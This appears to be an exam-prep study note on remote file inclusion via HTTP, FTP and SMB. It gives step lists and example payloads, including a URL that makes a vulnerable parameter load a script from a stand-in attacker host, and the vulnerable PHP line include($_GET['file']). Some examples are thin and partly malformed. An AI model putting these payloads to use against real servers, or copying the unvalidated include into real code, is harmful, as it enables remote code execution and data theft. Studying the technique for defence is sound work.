---
# 🌐 RFI Protocols - HTTP, FTP, SMB remote file inclusion for direct RCE

> [!ABSTRACT] Overview of Remote File Inclusion (RFI) Exploits via HTTP, FTP, and SMB.
>
> This document outlines the process to achieve **Direct Remote Code Execution** by leveraging RFI vulnerabilities in various protocols.

---

## 📑 Introduction to RFI
> [!INFO] What is RFI?
>
> **Remote File Inclusion (RFI)** refers to a web security vulnerability that allows an attacker to include arbitrary files from remote hosts via the server's file inclusion functionality. This can be exploited for direct code execution if the server does not validate or filter external inputs correctly.

---

## 🛰️ HTTP Protocol

### Overview
> [!NOTE] Common Use Cases
>
> RFI vulnerabilities in HTTP are often found in web applications where user input is directly included as a file path. Attackers can inject malicious payloads to execute arbitrary commands on the server.

### Exploitation Steps
1. Identify vulnerable parameters.
2. Craft a payload URL with an external script.
3. Monitor for signs of successful inclusion or execution.

---

## 📡 FTP Protocol

### Overview
> [!INFO] FTP Basics
>
> File Transfer Protocol (FTP) allows users to transfer files between computers on the Internet. An RFI exploit here would involve uploading a malicious file and including it remotely via an application vulnerability.

### Exploitation Steps
1. Upload payload script using FTP.
2. Include the uploaded path in vulnerable application code.
3. Execute commands by navigating through included scripts.

---

## 🛰️ SMB Protocol

### Overview
> [!NOTE] SMB Basics
>
> **SMB** (Server Message Block) protocol allows remote file sharing and command execution over a network. RFI via SMB would involve abusing shares for direct code inclusion or leveraging existing vulnerabilities.

### Exploitation Steps
1. Identify accessible SMB shares.
2. Upload malicious script to the share if writable permissions are available.
3. Include path to uploaded script in vulnerable application to execute arbitrary commands.

---

## 📄 Code Execution Examples

### HTTP RFI Example

```bash
# Malicious Payload URL via HTTP GET Request
http://target.com/vulnerable.php?file=http://attacker.com/malware.php
```

> [!WARNING]
> This example payload could lead to remote code execution if the target application does not validate input and includes it directly.

### FTP RFI Example

```bash
# Uploading malicious script via FTP
ftp://target.com/uploaded_payload.php
```

```text
# Including uploaded file path in vulnerable PHP code
include($_GET['file']);
?>
```

> [!DANGER]
> Directly uploading and including a payload script can result in remote command execution on the target server.

### SMB RFI Example

```bash
# Uploading malicious script to SMB share
smb://target.com/shared_folder/malicious_payload.php
```

```text
# Including uploaded file path within vulnerable application code
include($_GET['file']);
?>
```

> [!WARNING]
> This technique exploits server configurations or applications that improperly handle remote file inclusions.

---

## ⚠️ Potential Risks

| Risk | Description |
|---|---|
| **Direct Code Execution** | Remote scripts can be executed on the target server leading to system compromise. |
| **Data Exfiltration** | Sensitive data might be stolen if RFI leads to unauthorized access. |
| **Lateral Movement** | Attackers may use RFI for lateral movement within a network by accessing other vulnerable systems via compromised servers. |

---

## 🧭 Exam Mental Model

```text
RFI Process Flow:
├─ Identify Vulnerability (Parameter, File Path)
│   ├─ HTTP/FTP/SMB URL
│   └─ Application Code Injection Point
└─ Exploit RFI (Upload/Payload Inclusion) → Remote Command Execution
```

> [!SUCCESS] Key Takeaway
>
> **RFI can be a powerful method for achieving direct command execution** if the application does not adequately validate or sanitize inputs.
---
